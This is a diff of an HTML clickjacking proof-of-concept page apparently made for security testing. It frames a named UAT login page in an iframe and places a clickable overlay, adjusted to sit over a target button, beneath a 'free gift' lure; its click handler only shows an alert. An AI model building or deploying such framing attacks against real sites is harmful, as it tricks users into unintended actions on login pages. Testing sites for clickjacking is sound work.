@@ -1,28 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Clickjacking Exploit</title>
+    <title>Clickjacking PoC</title>
     <style>
         body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        h1 {
-            color: red;
-        }
-        .overlay {
-            position: absolute;
-            top: 50px;
-            left: 50px;
-            width: 400px;
-            height: 50px;
-            background-color: rgba(255, 0, 0, 0.6);
-            text-align: center;
-            color: white;
-            line-height: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            z-index: 99;
+            margin: 0;
+            overflow: hidden;
         }
         iframe {
             position: absolute;
@@ -30,15 +13,28 @@
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.9; /* Make it barely visible */
+            border: none;
+            opacity: 1; /* fully visible */
             z-index: 1;
+        }
+        .overlay {
+            position: absolute;
+            top: 420px; /* Adjust to match button Y position */
+            left: 540px; /* Adjust to match button X position */
+            width: 312px;
+            height: 62px;
+            border-radius: 30px;
+            z-index: 99;
+            background: rgba(255,255,255,0.3); /* Red semi-transparent */
+			pointer-events: auto;
         }
     </style>
 </head>
 <body>
-    <h1>Click to Get a Free Gift! 🎁</h1>
-    <div class="overlay" onclick="alert('Clickjacking Successful! User clicked hidden login button')">
-        Click Here to Claim Your Reward
+
+ <h1>Click to Get a Free Gift! 🎁</h1>
+    <div class="overlay" onclick="alert('Clickjacking Successful!')">
+        <!-- Empty clickable area -->
     </div>
     <iframe src="https://nexuschat-uat.cloud-practice.tech/auth" frameborder="0"></iframe>
 </body>
